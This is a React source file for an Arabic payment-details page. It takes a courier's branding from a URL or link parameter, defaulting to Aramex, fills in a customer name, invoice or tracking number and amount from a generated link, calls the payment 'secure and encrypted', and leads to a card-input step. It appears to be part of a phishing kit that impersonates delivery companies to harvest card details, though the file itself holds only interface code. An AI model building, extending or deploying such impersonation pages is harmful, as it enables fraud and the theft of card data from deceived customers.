import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { Shield } from "lucide-react";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, User } from "lucide-react";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);

  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
  const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
  const branding = getServiceBranding(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);
  const shippingInfo = linkData?.payload as any;

  // Get hero image from branding
  const heroImage = branding.heroImage || "/assets/hero-bg.jpg";

  // Get country code from link data
  const countryCode = shippingInfo?.selectedCountry || "SA";

  // Get currency info for display
  const currencyInfo = getCurrencyByCountry(countryCode);

  // Get payment data from link data
  const paymentData = shippingInfo?.payment_data;

  // Get amount from payment data or shipping info
  const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  // Format amount with currency symbol and name
  const formattedAmount = formatCurrency(amount, countryCode);
  
  const handleProceed = () => {
    navigate(`/pay/${id}/card-input`);
  };
  
  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title="تفاصيل الدفع"
        description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
      />
      <Helmet>
        <html className="light-mode" />
        <body className="light-mode" />
      </Helmet>
      <div className="min-h-screen light-mode" style={{ backgroundColor: branding.colors.surface }} dir="rtl">
        {/* Hero Section with Company Branding */}
        <div className="relative w-full h-48 sm:h-64 overflow-hidden">
          <img 
            src={heroImage}
            alt={serviceName}
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
          
          {/* Logo Overlay */}
          <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
            {branding.logo && (
              <div 
                className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg"
                style={{
                  border: `2px solid ${branding.colors.primary}`,
                  boxShadow: branding.shadows.md
                }}
              >
                <img 
                  src={branding.logo} 
                  alt={serviceName}
                  className="h-12 sm:h-16 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            )}
          </div>
          
          {/* Title Overlay */}
          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
            <div className="text-right">
              <h2 
                className="text-lg sm:text-2xl font-bold mb-1"
                style={{
                  fontFamily: branding.fonts.primaryAr,
                  textShadow: '2px 2px 4px rgba(0,0,0,0.5)'
                }}
              >
                {serviceName}
              </h2>
              <p 
                className="text-xs sm:text-sm opacity-90"
                style={{
                  fontFamily: branding.fonts.primaryAr,
                  textShadow: '1px 1px 2px rgba(0,0,0,0.5)'
                }}
              >
                خدمة دفع آمنة
              </p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10 pb-8">
          <div className="max-w-2xl mx-auto">
            <Card 
              className="p-4 sm:p-8 shadow-2xl border-t-4" 
              style={{ 
                borderTopColor: branding.colors.primary,
                background: branding.colors.background,
                boxShadow: branding.shadows.lg
              }}
            >
              {/* Header */}
              <div className="flex items-center justify-between mb-6 sm:mb-8">
                <h1 
                  className="text-xl sm:text-3xl font-bold"
                  style={{
                    color: branding.colors.text,
                    fontFamily: branding.fonts.primaryAr
                  }}
                >
                  تفاصيل الدفع
                </h1>
                
                <div
                  className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                  style={{
                    background: branding.gradients.primary,
                  }}
                >
                  <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                </div>
              </div>

              {/* Payment Data Display */}
              {(shippingInfo || paymentData) && (
                <div 
                  className="mb-6 sm:mb-8 p-3 sm:p-4 rounded-lg"
                  style={{
                    backgroundColor: branding.colors.surface,
                    borderRadius: branding.borderRadius.md
                  }}
                >
                  <h3 
                    className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
                    style={{
                      color: branding.colors.text,
                      fontFamily: branding.fonts.primaryAr
                    }}
                  >
                    بيانات السداد
                  </h3>
                  <div className="space-y-2 text-xs sm:text-sm">
                    {paymentData?.customer_name && (
                      <div className="flex items-center gap-2">
                        <User className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
                        <span style={{ color: branding.colors.textLight }}>الاسم:</span>
                        <span className="font-semibold" style={{ color: branding.colors.text }}>{paymentData.customer_name}</span>
                      </div>
                    )}
                    {paymentData?.invoice_number && (
                      <div className="flex items-center gap-2">
                        <Hash className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
                        <span style={{ color: branding.colors.textLight }}>الرقم المفوتر:</span>
                        <span className="font-semibold" style={{ color: branding.colors.text }}>{paymentData.invoice_number}</span>
                      </div>
                    )}
                    {paymentData?.selected_service_name && (
                      <div className="flex items-center gap-2">
                        <Truck className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
                        <span style={{ color: branding.colors.textLight }}>الخدمة:</span>
                        <span className="font-semibold" style={{ color: branding.colors.text }}>{paymentData.selected_service_name}</span>
                      </div>
                    )}
                    {shippingInfo?.tracking_number && (
                      <div className="flex items-center gap-2">
                        <Hash className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
                        <span style={{ color: branding.colors.textLight }}>رقم الشحنة:</span>
                        <span className="font-semibold" style={{ color: branding.colors.text }}>{shippingInfo.tracking_number}</span>
                      </div>
                    )}
                    {shippingInfo?.package_description && (
                      <div className="flex items-center gap-2">
                        <Package className="w-3 h-3 sm:w-4 sm:h-4" style={{ color: branding.colors.textLight }} />
                        <span style={{ color: branding.colors.textLight }}>وصف الطرد:</span>
                        <span className="font-semibold" style={{ color: branding.colors.text }}>{shippingInfo.package_description}</span>
                      </div>
                    )}
                  </div>
                </div>
              )}
              
              {/* Payment Summary */}
              <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                {paymentData?.selected_service_name && (
                  <div 
                    className="flex justify-between py-2 sm:py-3 border-b text-sm sm:text-base"
                    style={{ borderColor: branding.colors.border }}
                  >
                    <span style={{ color: branding.colors.textLight }}>الخدمة</span>
                    <span className="font-semibold" style={{ color: branding.colors.text }}>{paymentData.selected_service_name}</span>
                  </div>
                )}
                {!paymentData?.selected_service_name && (
                  <div 
                    className="flex justify-between py-2 sm:py-3 border-b text-sm sm:text-base"
                    style={{ borderColor: branding.colors.border }}
                  >
                    <span style={{ color: branding.colors.textLight }}>الخدمة</span>
                    <span className="font-semibold" style={{ color: branding.colors.text }}>{serviceName}</span>
                  </div>
                )}

                <div
                  className="flex justify-between py-3 sm:py-4 rounded-lg px-3 sm:px-4"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`,
                    borderRadius: branding.borderRadius.md
                  }}
                >
                  <span 
                    className="text-base sm:text-lg font-bold"
                    style={{
                      color: branding.colors.text,
                      fontFamily: branding.fonts.primaryAr
                    }}
                  >
                    المبلغ الإجمالي
                  </span>
                  <span 
                    className="text-xl sm:text-2xl font-bold" 
                    style={{ 
                      color: branding.colors.primary,
                      fontFamily: branding.fonts.primaryAr
                    }}
                  >
                    {formattedAmount}
                  </span>
                </div>
              </div>
            
              {/* Payment Method */}
              <div className="mb-6 sm:mb-8">
                <h3 
                  className="font-semibold mb-2 sm:mb-3 text-sm sm:text-base"
                  style={{
                    color: branding.colors.text,
                    fontFamily: branding.fonts.primaryAr
                  }}
                >
                  طريقة الدفع
                </h3>
                <div
                  className="border-2 rounded-lg sm:rounded-xl p-3 sm:p-4 hover:shadow-md transition-shadow"
                  style={{
                    borderColor: branding.colors.primary,
                    background: `${branding.colors.primary}10`,
                    borderRadius: branding.borderRadius.md
                  }}
                >
                  <div className="flex items-center gap-2 sm:gap-3">
                    <div
                      className="w-10 h-10 rounded-full flex items-center justify-center"
                      style={{ backgroundColor: branding.colors.primary }}
                    >
                      <CreditCard className="w-5 h-5 text-white" />
                    </div>
                    <div>
                      <p 
                        className="font-semibold text-sm sm:text-base"
                        style={{
                          color: branding.colors.text,
                          fontFamily: branding.fonts.primaryAr
                        }}
                      >
                        الدفع بالبطاقة
                      </p>
                      <p 
                        className="text-xs sm:text-sm" 
                        style={{ color: branding.colors.textLight }}
                      >
                        Visa، Mastercard، Mada
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {/* Security Badge */}
              <div className="mb-6 sm:mb-8">
                <div 
                  className="flex items-center gap-3 p-4 rounded-lg border" 
                  style={{ 
                    borderColor: branding.colors.secondary,
                    backgroundColor: `${branding.colors.secondary}08`,
                    borderRadius: branding.borderRadius.md
                  }}
                >
                  <div
                    className="w-10 h-10 rounded-full flex items-center justify-center"
                    style={{ backgroundColor: `${branding.colors.secondary}15` }}
                  >
                    <Shield className="w-5 h-5" style={{ color: branding.colors.secondary }} />
                  </div>
                  <div>
                    <p 
                      className="font-semibold text-sm sm:text-base" 
                      style={{ 
                        color: branding.colors.text,
                        fontFamily: branding.fonts.primaryAr
                      }}
                    >
                      دفع آمن ومشفر
                    </p>
                    <p 
                      className="text-xs sm:text-sm" 
                      style={{ color: branding.colors.textLight }}
                    >
                      جميع المعلومات مُشفرة ومحمية بأعلى معايير الأمان
                    </p>
                  </div>
                </div>
              </div>
              
              {/* Proceed Button */}
              <Button
                onClick={handleProceed}
                size="lg"
                className="w-full h-14 text-lg font-bold text-white hover:opacity-90 transition-all"
                style={{
                  background: branding.gradients.primary,
                  borderRadius: branding.borderRadius.lg,
                  boxShadow: branding.shadows.md,
                  fontFamily: branding.fonts.primaryAr
                }}
              >
                <span className="ml-2">الدفع بالبطاقة</span>
                <ArrowLeft className="w-5 h-5 mr-2" />
              </Button>

              <p 
                className="text-[10px] sm:text-xs text-center mt-4" 
                style={{ 
                  color: branding.colors.textLight,
                  fontFamily: branding.fonts.primaryAr
                }}
              >
                بالمتابعة، أنت توافق على الشروط والأحكام
              </p>
            </Card>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentDetails;
